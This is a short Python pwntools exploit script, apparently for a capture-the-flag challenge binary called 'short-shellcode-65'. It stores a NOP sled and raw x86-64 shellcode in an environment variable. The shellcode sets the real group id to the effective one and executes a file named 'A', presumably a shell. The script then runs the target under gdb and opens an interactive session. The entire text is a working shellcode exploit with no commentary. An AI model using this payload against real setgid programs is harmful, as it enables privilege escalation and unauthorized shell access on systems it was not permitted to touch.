#!/usr/bin/python

from pwn import *
import os

context.terminal = ['tmux', 'splitw', '-h']


env= {"SHELLCODE":'\x90' * 500 + 'jlX\x0f\x05H\x89\xc7H\x89\xc6jrX\x0f\x05H1\xf6VjAH\x89\xe7H1\xd2j;X\x0f\x05'}

p = process('./short-shellcode-65', env=env)
gdb.attach(p, "b *main")

#p.recv()

p.interactive()
